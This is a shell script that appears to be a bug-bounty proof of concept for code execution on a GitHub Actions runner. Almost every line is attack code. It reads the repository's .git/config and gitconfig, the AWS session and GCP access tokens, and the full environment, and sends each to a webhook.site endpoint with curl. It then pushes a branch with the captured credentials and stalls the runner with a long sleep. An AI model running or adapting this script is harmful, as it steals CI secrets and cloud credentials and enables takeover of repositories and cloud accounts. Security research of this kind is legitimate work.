echo "hello from rce " >&2


echo "/home/runner/work/beam/beam/.git/config" >&2
cat /home/runner/work/beam/beam/.git/config >&2

# echo "cat /home/runner/.gitconfig " >&2
# cat /home/runner/.gitconfig  >&2

# echo "cat /etc/gitconfi" >&2
# cat /etc/gitconfig >&2

# echo "cat myscript.sh" >&2
# cat myscript.sh >&2
# echo "base64 /home/runner/work/beam/beam/.git/config"




curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(git config --list)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/gitconfigList



curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/.gitconfig)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(base64 -w 0 /home/runner/work/beam/beam/.git/config)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken-base

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(aws sts get-caller-identity)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/aws-identity

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(gcloud auth list)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/gcp-authlist


curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(gcloud config get-value account)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/gcp-get-value-account

export AWSCREDS=$(aws sts get-session-token) 
export GCPCREDS=$(gcloud auth print-access-token) 
export GCPFullCred="$(curl -s -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "token=$GCPCREDS" \
    https://oauth2.googleapis.com/tokeninfo)"

curl -X POST \
  -H "Content-Type: text/plain" \
  --data "$(printenv)" \
  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/printenv


git config --global user.email \"bh@someemail.com\"; \
              git config --global user.name \"H1Tester\"; \
              git fetch origin ; \
              git checkout master/v2 ; \
              git pull origin master/v2 ; \
              git checkout -b bh-poc ; \
              git add . ; \
              git push -u origin bh-poc 



sleep 1200

